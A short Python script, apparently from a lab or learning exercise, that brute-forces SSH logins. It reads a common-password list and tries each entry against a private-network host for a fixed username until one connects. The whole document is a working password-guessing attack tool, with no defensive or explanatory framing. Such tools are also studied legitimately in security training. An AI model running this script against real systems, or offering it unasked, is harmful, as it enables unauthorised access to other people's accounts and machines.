from pwn import *
import paramiko
import time

host = "192.168.56.4"
username = "user"
attempts= 0

with open ("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password '{}!'".format(attempts,password))
            sleep (10)
            response = ssh (host= host, user=username, password=password, timeout = 1)
            if response.connected():
                print ("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password!")
        attempts +=1

            